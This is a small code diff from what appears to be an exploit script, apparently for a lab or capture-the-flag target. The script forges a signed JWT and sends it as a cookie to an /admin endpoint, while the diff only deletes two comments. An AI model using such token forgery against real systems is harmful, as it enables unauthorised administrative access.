@@ -134,7 +134,6 @@ def main():
     token = signing_input.decode() + "." + b64url_encode(sig)
     print(f"[+] Forged JWT:\n{token}")
 
-    # verify local
     try:
         h2 = SHA256.new(signing_input)
         pkcs1_15.new(rsa_priv.publickey()).verify(h2, sig)
@@ -142,7 +141,6 @@ def main():
     except Exception as e:
         print(f"[!] Local verify failed: {e}")
 
-    # Send token via cookie to /admin
     admin_url = BASE_URL.rstrip("/") + "/admin"
     try:
         print(f"[*] Trying admin endpoint (via cookie): {admin_url}")
